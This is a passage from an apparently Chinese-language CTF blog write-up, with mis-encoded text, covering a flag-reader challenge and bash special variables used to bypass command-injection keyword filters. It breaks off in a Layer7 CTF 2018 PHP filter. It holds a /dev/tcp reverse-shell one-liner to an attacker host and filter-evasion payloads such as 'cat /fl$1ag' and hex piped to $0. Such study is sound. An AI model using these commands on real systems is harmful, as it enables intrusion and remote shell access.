</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;syscall.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>buff</span><span class=p>[</span><span class=mi>4096</span><span class=p>],</span> <span class=n>rnd</span><span class=p>[</span><span class=mi>16</span><span class=p>],</span> <span class=n>val</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nf>syscall</span><span class=p>(</span><span class=n>SYS_getrandom</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>rnd</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rnd</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span> <span class=o>!=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rnd</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Not enough random</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>18</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>setuid</span><span class=p>(</span><span class=mi>1337</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>seteuid</span><span class=p>(</span><span class=mi>1337</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>alarm</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>rnd</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rnd</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>val</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>val</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nf>memcmp</span><span class=p>(</span><span class=n>rnd</span><span class=p>,</span> <span class=n>val</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rnd</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=n>fd</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=kt>int</span> <span class=n>s</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buff</span><span class=p>,</span> <span class=mi>1024</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span><span class=p>(</span><span class=n>s</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>buff</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>			<span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Can not open file</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>18</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Wrong response</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ä½¿ç”¨<code>bash -c "sh >& /dev/tcp/your ip/port 0>&amp;1" </code>ç›´æ¥åå¼¹ shell</p><p>è¿è¡Œ<code>flag-reader</code></p><p><img src=https://blogpic.zdy.one/img/20190610008222.jpg loading=lazy></p><p>å®¡è®¡ä¸€ä¸‹è¿™æ®µä»£ç ï¼Œå¤§è‡´æ˜¯è¾“å‡ºä¸€ä¸²éšæœºæ•°ï¼Œç„¶ååœ¨1sä¹‹å†…åˆè¦è¾“å…¥è¿›å»ï¼Œå¦åˆ™å°±<code>write(1, "Wrong response\n", 16);</code>&mldr;</p><p>ç„¶è€Œæˆ‘åœ¨å›å¼¹ shell ä¹‹åï¼Œåˆ©ç”¨<code>/tmp</code>å¯å†™çš„æƒé™ï¼Œè²Œä¼¼æœ‰ç‚¹å°é—®é¢˜ï¼Œä¸€æ—¦<code>cat /tmp/zedd</code>ï¼Œé“¾æ¥å°±æ–­æ‰äº†ï¼Œæ— å¥ˆåªèƒ½æ‰¾å…¶ä»–æ–‡ä»¶å¤¹ï¼Œå‘ç°<code>/run/lock</code>ä¸<code>/var/tmp</code>å‡å¯è¯»å¯å†™ï¼Œä½¿ç”¨<code>/flag-reader flag > /run/lock/zedd &lt; /run/lock/zedd</code>å†™å…¥ flag</p><p>åå¼¹ shell ä½¿ç”¨<code>cat</code>éå¸¸å®¹æ˜“æ–­æ‰ï¼Œæœ€å¥½ä½¿ç”¨æ‰§è¡Œçš„æ–¹å¼ï¼Œæœ€åå¾—åˆ° flag</p><p><img src=https://blogpic.zdy.one/img/20190610001695.jpg loading=lazy></p><h2 id=ä¸Šç¯‡çš„è§£é‡Šä¸è¡¥å……>ä¸Šç¯‡çš„è§£é‡Šä¸è¡¥å……</h2><h3 id=ç‰¹æ®Šå˜é‡>ç‰¹æ®Šå˜é‡</h3><p>è¿™é‡Œå†å¯¹ä¸Šç¯‡è¿›è¡Œä¸€å®šçš„è¡¥å……ä¸è§£é‡Šã€‚</p><h4 id=n>$n</h4><div class=table-wrapper><table><thead><tr><th>å˜é‡</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>$0</td><td>å½“å‰è„šæœ¬çš„æ–‡ä»¶å</td></tr><tr><td>$n</td><td>ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ã€‚n æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¾‹å¦‚ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯$2(0&lt;n&lt;9)</td></tr><tr><td>${n}</td><td>9&lt;næ—¶éœ€è¦åŠ ä¸Šå¤§æ‹¬å·</td></tr></tbody></table></div><p>ä¾‹å¦‚ï¼Œè„šæœ¬æ–‡ä»¶å¦‚ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;File Name: </span><span class=nv>$0</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;First Parameter : </span><span class=nv>$1</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;First Parameter : </span><span class=nv>$2</span><span class=s2>&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>æ‰§è¡Œè„šæœ¬æ–‡ä»¶</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./test.sh Hello Zedd
</span></span><span class=line><span class=cl>File Name: ./test.sh
</span></span><span class=line><span class=cl>First Parameter : Hello
</span></span><span class=line><span class=cl>Second Parameter : Zedd
</span></span></code></pre></td></tr></table></div></div><p>è€Œå½“æ²¡æœ‰å‚æ•°çš„æ—¶å€™ï¼Œ<code>$n</code>å°±ä¸ºç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨<code>cat /fl$1ag</code>è¿™æ ·ç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼Œå¹¶ä¸”åœ¨ bash ç¯å¢ƒä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$0</span>
</span></span><span class=line><span class=cl>bash
</span></span></code></pre></td></tr></table></div></div><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™æ ·çš„ payload ï¼Œå¯ä»¥ç”¨åœ¨ bash è¿™ä¸ªå…³é”®å­—è¿‡æ»¤ä½†æ˜¯æœ‰éœ€è¦ç”¨åˆ° bash çš„æƒ…å†µä¸‹ï¼Œå‰ææ˜¯ç¯å¢ƒç”¨çš„æ˜¯ bash</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=o>{</span>printf,<span class=s2>&#34;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&#34;</span><span class=o>}</span><span class=p>|</span><span class=nv>$0</span>
</span></span><span class=line><span class=cl>flag<span class=o>{</span>xxx<span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=ifs>$IFS</h4><p>IFS(Internal Field Seprator) ï¼Œå†…éƒ¨åŸŸåˆ†éš”ç¬¦ï¼ŒShell çš„ç¯å¢ƒå˜é‡åˆ†ä¸º set, env ä¸¤ç§ï¼Œå…¶ä¸­ set å˜é‡å¯ä»¥é€šè¿‡ export å·¥å…·å¯¼å…¥åˆ° env å˜é‡ä¸­ã€‚å…¶ä¸­ï¼Œset æ˜¯æ˜¾ç¤ºè®¾ç½®shellå˜é‡ï¼Œä»…åœ¨æœ¬ shell ä¸­æœ‰æ•ˆï¼›env æ˜¯æ˜¾ç¤ºè®¾ç½®ç”¨æˆ·ç¯å¢ƒå˜é‡ ï¼Œä»…åœ¨å½“å‰ä¼šè¯ä¸­æœ‰æ•ˆã€‚æ¢å¥è¯è¯´ï¼Œset å˜é‡é‡ŒåŒ…å«äº† env å˜é‡ï¼Œä½† set å˜é‡ä¸ä¸€å®šéƒ½æ˜¯ env å˜é‡ã€‚è¿™ä¸¤ç§å˜é‡ä¸åŒä¹‹å¤„åœ¨äºå˜é‡çš„ä½œç”¨åŸŸä¸åŒã€‚æ˜¾ç„¶ï¼Œenv å˜é‡çš„ä½œç”¨åŸŸè¦å¤§äº›ï¼Œå®ƒå¯ä»¥åœ¨ subshell ä¸­ä½¿ç”¨ã€‚</p><p>è€Œ IFS æ˜¯ä¸€ç§ set å˜é‡ï¼Œå½“ shell å¤„ç†"å‘½ä»¤æ›¿æ¢"å’Œ"å‚æ•°æ›¿æ¢"æ—¶ï¼Œshell æ ¹æ® IFS çš„å€¼ï¼Œé»˜è®¤æ˜¯ space, tab, newline æ¥æ‹†è§£è¯»å…¥çš„å˜é‡ï¼Œç„¶åå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œå¤„ç†ï¼Œæœ€åé‡æ–°ç»„åˆèµ‹å€¼ç»™è¯¥å˜é‡ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$IFS</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$IFS</span><span class=s2>&#34;</span> <span class=p>|</span> od -b
</span></span><span class=line><span class=cl><span class=m>0000000</span> <span class=m>040</span> <span class=m>011</span> <span class=m>012</span> <span class=m>012</span>
</span></span><span class=line><span class=cl><span class=m>0000004</span>
</span></span></code></pre></td></tr></table></div></div><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç›´æ¥è¾“å‡ºIFSæ˜¯çœ‹ä¸åˆ°çš„ï¼ŒæŠŠå®ƒè½¬åŒ–ä¸ºäºŒè¿›åˆ¶å°±å¯ä»¥çœ‹åˆ°äº†ï¼Œ&ldquo;040"æ˜¯ç©ºæ ¼ï¼Œ&ldquo;011"æ˜¯Tabï¼Œ&ldquo;012"æ˜¯æ¢è¡Œç¬¦&rdquo;\n&rdquo; ã€‚æœ€åä¸€ä¸ª 012 æ˜¯å› ä¸º echo é»˜è®¤æ˜¯ä¼šæ¢è¡Œçš„ã€‚</p><h4 id=heading>$?</h4><p>ä¸Šä¸ªå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ï¼Œæˆ–å‡½æ•°çš„è¿”å›å€¼ã€‚é€€å‡ºçŠ¶æ€æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¤§éƒ¨åˆ†å‘½ä»¤æ‰§è¡ŒæˆåŠŸä¼šè¿”å›0ï¼Œå¤±è´¥è¿”å›1ã€‚ä¸è¿‡ï¼Œä¹Ÿæœ‰ä¸€äº›å‘½ä»¤è¿”å›å…¶ä»–å€¼ï¼Œè¡¨ç¤ºä¸åŒç±»å‹çš„é”™è¯¯ã€‚</p><h4 id=heading-1>$</h4><p>å½“å‰ Shell è¿›ç¨‹ IDã€‚å¯¹äº Shell è„šæœ¬ï¼Œå°±æ˜¯è¿™äº›è„šæœ¬æ‰€åœ¨çš„è¿›ç¨‹ IDã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$$</span>
</span></span><span class=line><span class=cl><span class=m>75576</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=heading-2>$#</h4><p>ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ä¸ªæ•°ã€‚</p><p>è„šæœ¬æ–‡ä»¶å†…å®¹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Total Number of Parameters : </span><span class=nv>$#</span><span class=s2>&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>æ‰§è¡Œå‘½ä»¤</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./test.sh Hello Zedd
</span></span><span class=line><span class=cl>Total Number of Parameters : <span class=m>2</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=ä¸>$*ä¸$@</h4><p>éƒ½æ˜¯ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ã€‚</p><p>è„šæœ¬æ–‡ä»¶å†…å®¹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Quoted Values: </span><span class=nv>$@</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Quoted Values: </span><span class=nv>$*</span><span class=s2>&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>æ‰§è¡Œå‘½ä»¤ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./test.sh Hello Zedd
</span></span><span class=line><span class=cl>Quoted Values: Hello Zedd
</span></span><span class=line><span class=cl>Quoted Values: Hello Zedd
</span></span></code></pre></td></tr></table></div></div><p>å®ƒä»¬ä¸è¢«åŒå¼•å·(&rdquo; &ldquo;)åŒ…å«æ—¶ï¼Œéƒ½ä»¥"1"&ldquo;2&rdquo; â€¦ &ldquo;$n&rdquo; çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚</p><p>ä½†æ˜¯å½“å®ƒä»¬è¢«åŒå¼•å·(&rdquo; &ldquo;)åŒ…å«æ—¶ï¼Œ"âˆ—&ldquo;ä¼šå°†æ‰€æœ‰çš„å‚æ•°ä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼Œä»¥"1 2â€¦n"çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ï¼›&rdquo;@&ldquo;ä¼šå°†å„ä¸ªå‚æ•°åˆ†å¼€ï¼Œä»¥"1&rdquo; &ldquo;2&rdquo;â€¦&ldquo;n&rdquo; çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°ã€‚</p><h3 id=å†…ç½®å˜é‡ç»•è¿‡>å†…ç½®å˜é‡ç»•è¿‡</h3><p>ä¸Šç¯‡å…¶å®æåˆ°äº†ä¸€ç‚¹<a class=link href=https://zeddyu.github.io/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87 target=_blank rel=noopener>å†…ç½®å˜é‡ç»•è¿‡</a>ï¼Œä½†æ˜¯è®²çš„ä¹Ÿä¸å¹¶ä¸å¤šï¼Œåªæ˜¯å¤§æ¦‚æäº†ä¸€ä¸‹ã€‚è¿™é‡Œå†ç»™ä¸€äº›å¸¸ç”¨çš„ bash å†…ç½®çš„ç¯å¢ƒå˜é‡</p><h4 id=bash>$BASH</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$BASH</span>
</span></span><span class=line><span class=cl>/usr/local/bin/bash
</span></span></code></pre></td></tr></table></div></div><p>è¿”å› bash äºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„</p><h4 id=home>$HOME</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nv>$HOME</span>
</span></span><span class=line><span class=cl>bash: /Users/zedd: Is a directory
</span></span></code></pre></td></tr></table></div></div><p>è¿”å›å½“å‰ç”¨æˆ·æ‰€å±ç›®å½•</p><h4 id=pwd>$PWD</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$PWD</span>
</span></span><span class=line><span class=cl>/
</span></span></code></pre></td></tr></table></div></div><p>æ˜¾ç¤ºå½“å‰ç›®å½•</p><h4 id=oldpwd>$OLDPWD</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$OLDPWD</span>
</span></span><span class=line><span class=cl>/Users/zedd/Desktop/
</span></span></code></pre></td></tr></table></div></div><p>è¿”å›ä¸Šæ¬¡æ‰€åœ¨ç›®å½•</p><h4 id=path>$PATH</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$PATH</span>
</span></span><span class=line><span class=cl>/bin:/usr/bin:/usr/local/bin:/usr/X11R6/bin:/sbin:/usr/sbin
</span></span></code></pre></td></tr></table></div></div><p>ç¯å¢ƒå˜é‡<code>$PATH</code></p><h4 id=ps1>$PS1</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$PS1</span>
</span></span><span class=line><span class=cl><span class=se>\s</span>-<span class=se>\v\$</span>
</span></span></code></pre></td></tr></table></div></div><p>çœ‹åˆ°çš„å‘½ä»¤è¡Œä¸»è¦æç¤º</p><h4 id=ps2>$PS2</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$PS2</span>
</span></span><span class=line><span class=cl>&gt;
</span></span></code></pre></td></tr></table></div></div><p>é¢å¤–è¾“å…¥çš„è¾…åŠ©æç¤ºï¼Œè¡¨ç¤ºä¸º<code>></code>ï¼Œ<code>$PS3</code>æ˜¯ Shell è„šæœ¬ä¸­ä½¿ç”¨<code>select</code>æ—¶çš„æç¤ºç¬¦ï¼Œæ˜¾ç¤ºä¸ºç©ºï¼Œè¿™é‡Œå°±ä¸å†å•ç‹¬åˆ—ä¸¾äº†</p><h4 id=ps4>$PS4</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nv>$PS4</span>
</span></span><span class=line><span class=cl>+
</span></span></code></pre></td></tr></table></div></div><p>ä¸<code>set -x</code>é…åˆç”¨æ¥ä¿®æ”¹è·Ÿè¸ªè¾“å‡ºçš„å‰ç¼€ï¼Œæ˜¾ç¤ºä¸º<code>+</code></p><h3 id=ä¸¾ä¸ª>ä¸¾ä¸ªğŸŒ°</h3><h4 id=layer7-ctf-2018>Layer7 CTF 2018</h4><p>å¯ä»¥è®¿é—®https://cat.canhack.me/è¿™ä¸ªåœ¨çº¿åœ°å€</p><h4 id=é¢˜ç›®æè¿°>é¢˜ç›®æè¿°</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This service provides read the file.
</span></span><span class=line><span class=cl>https://cat.canhack.me/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>This challenge was published in the Layer7 CTF in 2018.
</span></span></code></pre></td></tr></table></div></div><h4 id=writeup>WriteUp</h4><p>ç‚¹è¿›å»å‘ç°æœ‰</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>b</span><span class=p>&gt;</span>Usage<span class=p>&lt;/</span><span class=nt>b</span><span class=p>&gt;</span>: Please enter the parameter like as in <span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;/?file=test.txt&#34;</span><span class=p>&gt;</span>this<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>.
</span></span></code></pre></td></tr></table></div></div><p>è·Ÿè¿›å¾—åˆ°<code>test.txt</code>çš„å†…å®¹</p><p><img src=https://blogpic.zdy.one/img/20190610006888.jpg loading=lazy></p><p>çŒœæµ‹ä¸ºæ–‡ä»¶åŒ…å«ï¼Œå°è¯•ç›´æ¥è¯»å–<code>flag</code>è¢«<code>waf</code>ï¼Œç›´æ¥è¯»å–<code>https://cat.canhack.me/?file=index.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>	<span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>require</span> <span class=no>__DIR__</span><span class=o>.</span><span class=s1>&#39;/flag-f72a161d445915d2bdcdc820c4143353.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/flag|\&#39;|\&#34;|`|\\\\|;|\(|\)|\*|\?|\.\.|\//i&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>			<span class=k>die</span><span class=p>(</span><span class=s1>&#39;no hack&#39;</span><span class=p>);</span>
